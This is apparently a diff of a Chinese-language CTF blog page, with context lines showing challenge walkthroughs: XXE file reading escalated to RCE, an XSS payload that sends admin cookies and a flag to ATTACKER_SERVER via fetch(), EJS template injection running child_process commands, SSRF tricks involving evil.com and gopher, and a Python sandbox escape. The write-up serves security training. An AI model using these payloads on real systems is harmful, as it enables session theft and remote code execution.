@@ -78,7 +78,7 @@
 <meta property="og:image" content="https://i4g5d.github.io/2025/11/05/CTFs-For-Facing/image-20251012201205520.png">
 <meta property="og:image" content="https://i4g5d.github.io/2025/11/05/CTFs-For-Facing/image-20251011003256797.png">
 <meta property="article:published_time" content="2025-11-05T15:08:04.000Z">
-<meta property="article:modified_time" content="2025-11-17T15:21:12.932Z">
+<meta property="article:modified_time" content="2025-11-18T05:37:17.138Z">
 <meta property="article:author" content="i4G5d">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://i4g5d.github.io/2025/11/05/CTFs-For-Facing/image-20251117191418284.png">
@@ -353,19 +353,19 @@
 <h3 id="KPCTF-2024-决赛-Where-is-the-flag"><a href="#KPCTF-2024-决赛-Where-is-the-flag" class="headerlink" title="[KPCTF 2024 决赛]Where is the flag"></a>[KPCTF 2024 决赛]Where is the flag</h3><p>这道题是少有能找到的XXE，结合XXE的文件读取和RCE，靶场通常不适合SSRF因为很会卡</p>
 <p>XXE通常用于文件读取但实际的情况下CTF根本不知道flag藏在哪里，于是要想办法升级到RCE</p>
 <p>开启环境第一步看到是PHP语言</p>
-<p><img src="/2025/11/05/CTFs-For-Facing/image-20251117191418284.png" srcset="/img/loading.gif" lazyload alt="image-20251117191418284"></p>
+<p><img src="/2025/11/05/CTFs-For-Facing/image-20251117191418284.png" srcset="/img/loading.gif" lazyload></p>
 <p>审计一下就是获取POST输入，将XML数据转换为PHP对象，然后根据XML语句回显</p>
 <p>修改请求方式，输入简单的XML测试</p>
-<p><img src="/2025/11/05/CTFs-For-Facing/image-20251117191855477.png" srcset="/img/loading.gif" lazyload alt="image-20251117191855477"></p>
+<p><img src="/2025/11/05/CTFs-For-Facing/image-20251117191855477.png" srcset="/img/loading.gif" lazyload></p>
 <p>成功进行了读取passwd，不知道flag在哪，用CVE-2024-2961来将漏洞提升到rce。</p>
 <p>先获取&#x2F;proc&#x2F;self&#x2F;maps和libc（用PHP伪协议也能获取）</p>
-<p><img src="/2025/11/05/CTFs-For-Facing/image-20251117192529021.png" srcset="/img/loading.gif" lazyload alt="image-20251117192529021"></p>
+<p><img src="/2025/11/05/CTFs-For-Facing/image-20251117192529021.png" srcset="/img/loading.gif" lazyload></p>
 <p>找到libc</p>
-<p><img src="/2025/11/05/CTFs-For-Facing/image-20251117192807368.png" srcset="/img/loading.gif" lazyload alt="image-20251117192807368"></p>
+<p><img src="/2025/11/05/CTFs-For-Facing/image-20251117192807368.png" srcset="/img/loading.gif" lazyload></p>
 <p>读取一下，后面发现是二进制文件只能用phpfilter为协议读</p>
 <p><code>&lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=/lib/x86_64-linux-gnu/libc-2.31.so&quot;&gt;</code></p>
 <p>下载<a target="_blank" rel="noopener" href="https://github.com/kezibei/php-filter-iconv">攻击脚本</a>,按照要求把这两个文件复制下来放入文件夹，修改代码，进行payload生成</p>
-<p><img src="/2025/11/05/CTFs-For-Facing/image-20251117195456145.png" srcset="/img/loading.gif" lazyload alt="image-20251117195456145"></p>
+<p><img src="/2025/11/05/CTFs-For-Facing/image-20251117195456145.png" srcset="/img/loading.gif" lazyload></p>
 <p>拿到payload注入后蚁剑连接即可</p>
 <h2 id="2-SQL注入"><a href="#2-SQL注入" class="headerlink" title="2.SQL注入"></a>2.SQL注入</h2><p>见博客<a href="https://i4g5d.github.io/2025/10/23/SQLI/">SQLI_</a>，了解四种方式 常用函数，绕过方式</p>
 <h2 id="3-XSS"><a href="#3-XSS" class="headerlink" title="3.XSS"></a>3.XSS</h2><p>XSS这方面想要说出点名堂就要结合<a href="https://i4g5d.github.io/2025/10/30/CSRF/">CSRF</a>并进行区分</p>
@@ -402,32 +402,32 @@
 </ul>
 </li>
 </ul>
-<h3 id="Level-69-MysteryMessageBoard"><a href="#Level-69-MysteryMessageBoard" class="headerlink" title="Level 69 MysteryMessageBoard"></a><strong>Level 69 MysteryMessageBoard</strong></h3><p>本题也有一个源码包，是go语言，打开靶场是一个登录界面<img src="/2025/11/05/CTFs-For-Facing/image-20251014225635690.png" srcset="/img/loading.gif" lazyload alt="image-20251014225635690"></p>
+<h3 id="Level-69-MysteryMessageBoard"><a href="#Level-69-MysteryMessageBoard" class="headerlink" title="Level 69 MysteryMessageBoard"></a><strong>Level 69 MysteryMessageBoard</strong></h3><p>本题也有一个源码包，是go语言，打开靶场是一个登录界面<img src="/2025/11/05/CTFs-For-Facing/image-20251014225635690.png" srcset="/img/loading.gif" lazyload></p>
 <p>这里源码第一段 至少能知道 有两个账号</p>
-<p><img src="/2025/11/05/CTFs-For-Facing/image-20251014225737915.png" srcset="/img/loading.gif" lazyload alt="image-20251014225737915"></p>
+<p><img src="/2025/11/05/CTFs-For-Facing/image-20251014225737915.png" srcset="/img/loading.gif" lazyload></p>
 <p>后面的代码没有提供密码的线索，那就先考虑爆破，发现这道题也是支持爆破的（一般都想尝试爆破admin 我也试了失败了，但想想应该也不可能）</p>
-<p><img src="/2025/11/05/CTFs-For-Facing/image-20251014230731375.png" srcset="/img/loading.gif" lazyload alt="image-20251014230731375"></p>
+<p><img src="/2025/11/05/CTFs-For-Facing/image-20251014230731375.png" srcset="/img/loading.gif" lazyload></p>
 <p>后面进入留言板，看起来像ssti，但代码没有提供任何解析模板的部分，但是像xss</p>
-<p><img src="/2025/11/05/CTFs-For-Facing/image-20251014230854337.png" srcset="/img/loading.gif" lazyload alt="image-20251014230854337"></p>
-<p>还有一个路由 &#x2F;admin 访问后<img src="/2025/11/05/CTFs-For-Facing/image-20251014232615999.png" srcset="/img/loading.gif" lazyload alt="image-20251014232615999"></p>
+<p><img src="/2025/11/05/CTFs-For-Facing/image-20251014230854337.png" srcset="/img/loading.gif" lazyload></p>
+<p>还有一个路由 &#x2F;admin 访问后<img src="/2025/11/05/CTFs-For-Facing/image-20251014232615999.png" srcset="/img/loading.gif" lazyload></p>
 <p>猜测有一种是xss获取admin的密钥后访问flag（因为还有一个flag接口）</p>
-<p><img src="/2025/11/05/CTFs-For-Facing/image-20251014232938007.png" srcset="/img/loading.gif" lazyload alt="image-20251014232938007"></p>
+<p><img src="/2025/11/05/CTFs-For-Facing/image-20251014232938007.png" srcset="/img/loading.gif" lazyload></p>
 <p>这里直接拼接commnets参数就确定了xss漏洞</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">当写入《img src=1 onerror=alert(1)》时，成功跳出弹窗 <br></code></pre></td></tr></table></figure>
 
-<p>但源码中，httponly也是设置为false，允许了窃取<img src="/2025/11/05/CTFs-For-Facing/image-20251014233332586.png" srcset="/img/loading.gif" lazyload alt="image-20251014233332586"></p>
+<p>但源码中，httponly也是设置为false，允许了窃取<img src="/2025/11/05/CTFs-For-Facing/image-20251014233332586.png" srcset="/img/loading.gif" lazyload></p>
 <p>尝试外带</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br><span class="hljs-keyword">var</span> admin_cookie = <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>;<br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;http://ATTACKER_SERVER/cookie?cookie=&#x27;</span> + <span class="hljs-built_in">encodeURIComponent</span>(admin_cookie));<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2025/11/05/CTFs-For-Facing/image-20251014233503668.png" srcset="/img/loading.gif" lazyload alt="image-20251014233503668"></p>
+<p><img src="/2025/11/05/CTFs-For-Facing/image-20251014233503668.png" srcset="/img/loading.gif" lazyload></p>
 <p>随后访问&#x2F;admin得到响应</p>
-<p><img src="/2025/11/05/CTFs-For-Facing/image-20251014233904830.png" srcset="/img/loading.gif" lazyload alt="image-20251014233904830"></p>
+<p><img src="/2025/11/05/CTFs-For-Facing/image-20251014233904830.png" srcset="/img/loading.gif" lazyload></p>
 <p>找到admin的session进行替换访问flag</p>
-<p><img src="/2025/11/05/CTFs-For-Facing/image-20251014233933996.png" srcset="/img/loading.gif" lazyload alt="image-20251014233933996"></p>
+<p><img src="/2025/11/05/CTFs-For-Facing/image-20251014233933996.png" srcset="/img/loading.gif" lazyload></p>
 <p>后话 那其实有一把锁的方法 直接让admin去访问flag即可	</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">r</span>=&gt;</span>r.<span class="hljs-title function_">text</span>()).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">f</span>=&gt;</span><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;http://ATTACKER_SERVER/log?f=&#x27;</span>+<span class="hljs-built_in">encodeURIComponent</span>(f)))<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2025/11/05/CTFs-For-Facing/image-20251014234416346.png" srcset="/img/loading.gif" lazyload alt="image-20251014234416346"></p>
+<p><img src="/2025/11/05/CTFs-For-Facing/image-20251014234416346.png" srcset="/img/loading.gif" lazyload></p>
 <p>​																																																																																																																																																																																																																																																																																																																																																																																																																			</p>
 <h2 id="4-文件上传"><a href="#4-文件上传" class="headerlink" title="4.文件上传"></a>4.文件上传</h2><p>文件上传比较基础 通常就是考几个绕过</p>
 <ul>
@@ -444,7 +444,7 @@
 <p>接受文件后 后端自动将其放入updates文件夹（不会更改文件名）</p>
 <p>并且提供了一个rename接口 （通过json方式提交）</p>
 <p>这里泄露了文件路径，但不知道有没有用</p>
-<p><img src="/2025/11/05/CTFs-For-Facing/image-20251014213117270.png" srcset="/img/loading.gif" lazyload alt="image-20251014213117270"></p>
+<p><img src="/2025/11/05/CTFs-For-Facing/image-20251014213117270.png" srcset="/img/loading.gif" lazyload></p>
 <p>经过对mortis.ejs模板的了解，思路就很清晰了，如果可以上传文件，随后通过重命名将mortis.ejs模板覆盖，模板就会执行我注入的内容</p>
 <p>├── app.js </p>
 <p>├── package.json </p>
@@ -453,23 +453,23 @@
 <p>│          └── mortis.ejs   &lt;– 你覆盖的模板文件 </p>
 <p>└── uploads&#x2F;         &lt;– 文件上传的目标目录</p>
 <p>​            └── your_file</p>
-<p>后期我们可以ls看一下<img src="/2025/11/05/CTFs-For-Facing/image-20251014224531385.png" srcset="/img/loading.gif" lazyload alt="image-20251014224531385"></p>
+<p>后期我们可以ls看一下<img src="/2025/11/05/CTFs-For-Facing/image-20251014224531385.png" srcset="/img/loading.gif" lazyload></p>
 <p>后面时间开始测试攻击 注意，这里的type要改成json，</p>
-<p><img src="/2025/11/05/CTFs-For-Facing/image-20251014215320217.png" srcset="/img/loading.gif" lazyload alt="image-20251014215320217"></p>
+<p><img src="/2025/11/05/CTFs-For-Facing/image-20251014215320217.png" srcset="/img/loading.gif" lazyload></p>
 <p>访问static，发现能打开</p>
-<p><img src="/2025/11/05/CTFs-For-Facing/image-20251014215359811.png" srcset="/img/loading.gif" lazyload alt="image-20251014215359811"></p>
+<p><img src="/2025/11/05/CTFs-For-Facing/image-20251014215359811.png" srcset="/img/loading.gif" lazyload></p>
 <p>那既然能简单的实现功能，那思路就很清晰了，一个点是RCE代码的拼写，另一个就是了解路径，通过路径穿越覆盖模板</p>
-<p>然后进行路径遍历覆盖<img src="/2025/11/05/CTFs-For-Facing/image-20251014224625991.png" srcset="/img/loading.gif" lazyload alt="image-20251014224625991"></p>
+<p>然后进行路径遍历覆盖<img src="/2025/11/05/CTFs-For-Facing/image-20251014224625991.png" srcset="/img/loading.gif" lazyload></p>
 <p>进行rce</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;%= <span class="hljs-variable language_">global</span>.<span class="hljs-property">process</span>.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&#x27;env&#x27;</span>).<span class="hljs-title function_">toString</span>() %&gt;<br>    or<br>&lt;%= process.<span class="hljs-property">env</span>.<span class="hljs-property">FLAG</span> || <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>).<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>) %&gt;<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2025/11/05/CTFs-For-Facing/image-20251014222213047.png" srcset="/img/loading.gif" lazyload alt="image-20251014222213047"></p>
+<p><img src="/2025/11/05/CTFs-For-Facing/image-20251014222213047.png" srcset="/img/loading.gif" lazyload></p>
 <p>我是三个成组发送请求，这样比较方便，最后查看&#x2F;路由即可</p>
 <p>这里居然没放在文件夹中</p>
-<p><img src="/2025/11/05/CTFs-For-Facing/image-20251014222243970.png" srcset="/img/loading.gif" lazyload alt="image-20251014222243970"></p>
+<p><img src="/2025/11/05/CTFs-For-Facing/image-20251014222243970.png" srcset="/img/loading.gif" lazyload></p>
 <p>最后在env中找到 ，</p>
 <p>可能是怕我们把flag给覆盖了导致解不出题？</p>
-<p><img src="/2025/11/05/CTFs-For-Facing/image-20251014222314127.png" srcset="/img/loading.gif" lazyload alt="image-20251014222314127"></p>
+<p><img src="/2025/11/05/CTFs-For-Facing/image-20251014222314127.png" srcset="/img/loading.gif" lazyload></p>
 <h2 id="5-SSRF"><a href="#5-SSRF" class="headerlink" title="5. SSRF"></a>5. SSRF</h2><p>SSRF能做到的通常就利用几种协议进行渗透和攻击</p>
 <ul>
 <li><p><strong>file协议</strong>，这个很普通，就是阅读这台主机的文件</p>
@@ -503,32 +503,32 @@
 
 <p>当 <code>php_url_parse</code> 认为 <code>google.com</code> 为目标的同时，<code>curl</code> 认为 <code>evil.com:80</code> 是目标。</p>
 <p>同理针对函数来构造可能还能绕过端口</p>
-<p><img src="/2025/11/05/CTFs-For-Facing/image-20250928180952263.png" srcset="/img/loading.gif" lazyload alt="image-20250928180952263"></p>
+<p><img src="/2025/11/05/CTFs-For-Facing/image-20250928180952263.png" srcset="/img/loading.gif" lazyload></p>
 <p>这是前期渗透绕过 后期攻击手法通常是打redis打mysql等</p>
 <p>gopherus用gopher打redis写🐎，或者打sql</p>
-<p><img src="/2025/11/05/CTFs-For-Facing/image-20251117223757654.png" srcset="/img/loading.gif" lazyload alt="image-20251117223757654"></p>
-<p><img src="/2025/11/05/CTFs-For-Facing/image-20251117223542723.png" srcset="/img/loading.gif" lazyload alt="image-20251117223542723"></p>
+<p><img src="/2025/11/05/CTFs-For-Facing/image-20251117223757654.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025/11/05/CTFs-For-Facing/image-20251117223542723.png" srcset="/img/loading.gif" lazyload></p>
 <p>将 _ 下划线后面的内容再进行一次 url 编码（防止出现特殊字符，后端 curl 接收到参数后会默认解码一次）</p>
 <p>后面RCE就行</p>
 <h2 id="6-SSTI"><a href="#6-SSTI" class="headerlink" title="6. SSTI"></a>6. SSTI</h2><p>CTF最喜欢出的题型之一，这里贴一组比较基础且全面的题目</p>
 <h3 id="魔理沙的借书之旅"><a href="#魔理沙的借书之旅" class="headerlink" title="魔理沙的借书之旅"></a><strong>魔理沙的借书之旅</strong></h3><ol>
 <li>源码提示用exec的post传code参数</li>
 </ol>
-<p><img src="/2025/11/05/CTFs-For-Facing/image-20250901231817858.png" srcset="/img/loading.gif" lazyload alt="image-20250901231817858"></p>
+<p><img src="/2025/11/05/CTFs-For-Facing/image-20250901231817858.png" srcset="/img/loading.gif" lazyload></p>
 <ol start="2">
 <li>限定内建函数，能用的就print，设计一个审计钩子，限制函数</li>
 </ol>
-<p><img src="/2025/11/05/CTFs-For-Facing/image-20250901231952022.png" srcset="/img/loading.gif" lazyload alt="image-20250901231952022"></p>
+<p><img src="/2025/11/05/CTFs-For-Facing/image-20250901231952022.png" srcset="/img/loading.gif" lazyload></p>
 <p>import禁止了引用，subprocess.Popen是<strong>创建新进程、执行外部命令</strong>，socket.socket禁用了于外部建立连接，防止反弹shell，open静止打开文件，builtins.eval&#x2F;exec禁止<strong>将字符串作为 Python 代码执行</strong></p>
 <p>于是直接构造 找object类 在subclasses找所有子类</p>
-<p><img src="/2025/11/05/CTFs-For-Facing/image-20251012212434520.png" srcset="/img/loading.gif" lazyload alt="image-20251012212434520"></p>
+<p><img src="/2025/11/05/CTFs-For-Facing/image-20251012212434520.png" srcset="/img/loading.gif" lazyload></p>
 <p>写一个小脚本能列出所有类名和序号</p>
 <p>最后从catchwarnings（POPEN也可以，因为是字符串形式所以不会被过滤）里拿出sys函数的os模块</p>
-<p><img src="/2025/11/05/CTFs-For-Facing/image-20250901153533689.png" srcset="/img/loading.gif" lazyload alt="image-20250901153533689"></p>
-<p><img src="/2025/11/05/CTFs-For-Facing/image-20250901153749458.png" srcset="/img/loading.gif" lazyload alt="image-20250901153749458"></p>
-<p><img src="/2025/11/05/CTFs-For-Facing/image-20250901155245189.png" srcset="/img/loading.gif" lazyload alt="image-20250901155245189"></p>
+<p><img src="/2025/11/05/CTFs-For-Facing/image-20250901153533689.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025/11/05/CTFs-For-Facing/image-20250901153749458.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025/11/05/CTFs-For-Facing/image-20250901155245189.png" srcset="/img/loading.gif" lazyload></p>
 <p>无回显 但我用os.listdir能看目录，这是关键所在</p>
-<p><img src="/2025/11/05/CTFs-For-Facing/image-20250901154840185.png" srcset="/img/loading.gif" lazyload alt="image-20250901154840185"></p>
+<p><img src="/2025/11/05/CTFs-For-Facing/image-20250901154840185.png" srcset="/img/loading.gif" lazyload></p>
 <p>因为不能open打开文件，所以只能尝试反弹shell，OOB外带，甚至查看进程也失败，但其实都是无法做到的</p>
 <p>好在有了目录 最后得到三种解法，</p>
 <ol>
@@ -541,15 +541,15 @@
 </ol>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 构造命令：读取1.txt第1行的第n个字符</span><br>command = <span class="hljs-string">f&quot;sed -n &#x27;1p&#x27; 1.txt | cut -c <span class="hljs-subst">&#123;n&#125;</span>&quot;</span> <span class="hljs-comment"># f&#x27;[ &quot;$(cut -c &#123;i&#125; flag)&quot; = &quot;&#123;c&#125;&quot; ]&#x27;</span><br><span class="hljs-comment"># 执行命令并输出结果</span><br>os.system(command)<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2025/11/05/CTFs-For-Facing/image-20250901233136705.png" srcset="/img/loading.gif" lazyload alt="image-20250901233136705"></p>
+<p><img src="/2025/11/05/CTFs-For-Facing/image-20250901233136705.png" srcset="/img/loading.gif" lazyload></p>
 <ol start="3">
 <li><p>还有一种解法 ，把flag写入网页 在看网页即可，（os.makedirs建立静态文件，写入文件 这是flask框架的静态文件方法）</p>
 <p>先创建静态文件</p>
-<p><img src="/2025/11/05/CTFs-For-Facing/image-20250901233643902.png" srcset="/img/loading.gif" lazyload alt="image-20250901233643902"></p>
+<p><img src="/2025/11/05/CTFs-For-Facing/image-20250901233643902.png" srcset="/img/loading.gif" lazyload></p>
 <p>随后写入文件 </p>
-<p><img src="/2025/11/05/CTFs-For-Facing/image-20250901233658393.png" srcset="/img/loading.gif" lazyload alt="image-20250901233658393"></p>
+<p><img src="/2025/11/05/CTFs-For-Facing/image-20250901233658393.png" srcset="/img/loading.gif" lazyload></p>
 <p>直接前端打开即可</p>
-<p><img src="/2025/11/05/CTFs-For-Facing/image-20250901233709358.png" srcset="/img/loading.gif" lazyload alt="image-20250901233709358"></p>
+<p><img src="/2025/11/05/CTFs-For-Facing/image-20250901233709358.png" srcset="/img/loading.gif" lazyload></p>
 </li>
 </ol>
 <h3 id="魔理沙的二次借书之旅"><a href="#魔理沙的二次借书之旅" class="headerlink" title="魔理沙的二次借书之旅"></a><strong>魔理沙的二次借书之旅</strong></h3><p>这是沙盒题的2.0 ，先贴上源码：</p>
